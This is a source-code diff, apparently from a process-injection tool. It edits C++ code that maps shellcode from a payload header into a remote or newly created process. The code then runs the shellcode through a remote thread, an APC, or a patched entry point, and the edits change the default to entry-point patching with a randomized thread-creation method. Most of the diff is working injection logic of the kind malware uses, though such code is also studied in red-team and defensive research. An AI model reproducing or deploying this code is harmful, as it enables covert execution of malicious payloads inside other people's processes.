@@ -8,9 +8,11 @@
 
 #include "payload.h"
 
-#define ADD_THREAD  0
-#define ADD_APC 1
-#define PATCH_EP 2
+typedef enum {
+    ADD_THREAD,
+    ADD_APC,
+    PATCH_EP
+} INJECTION_POINT;
 
 using namespace std;
 
@@ -62,7 +64,7 @@ PVOID map_code_into_process(HANDLE hProcess, LPBYTE shellcode, SIZE_T shellcodeS
     return sectionBaseAddress2;
 }
 
-bool inject_in_new_process(DWORD mode)
+bool inject_in_new_process(INJECTION_POINT mode)
 {
     PROCESS_INFORMATION pi;
     memset(&pi, 0, sizeof(PROCESS_INFORMATION));
@@ -73,7 +75,7 @@ bool inject_in_new_process(DWORD mode)
     switch (mode) {
     case ADD_THREAD:
         remote_shellcode_ptr = map_code_into_process(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
-        run_shellcode_in_new_thread(pi.hProcess, remote_shellcode_ptr);
+        run_shellcode_in_new_thread(pi.hProcess, remote_shellcode_ptr, THREAD_CREATION_METHOD::usingRandomMethod);
         // not neccessery to resume the main thread
         break;
     case ADD_APC:
@@ -99,8 +101,7 @@ bool inject_in_existing_process()
     if (remote_shellcode_ptr == NULL) {
         return false;
     }
-    run_shellcode_in_new_thread2(hProcess, remote_shellcode_ptr);
-    return true;
+    return run_shellcode_in_new_thread2(hProcess, remote_shellcode_ptr);
 }
 
 int main()
@@ -110,14 +111,14 @@ int main()
         return (-1);
     }
     if (load_kernel32_functions() == FALSE) {
-        printf("Failed to load NTDLL function\n");
+        printf("Failed to load KERNEL32 function\n");
         return (-1);
     }
 
     if (inject_in_existing_process()) {
         printf("[SUCCESS] Code injected in existing process!\n");
     } else {
-        if (inject_in_new_process(ADD_THREAD)) {
+        if (inject_in_new_process(INJECTION_POINT::PATCH_EP)) {
              printf("[SUCCESS] Code injected in a new process!\n");
         }
     }
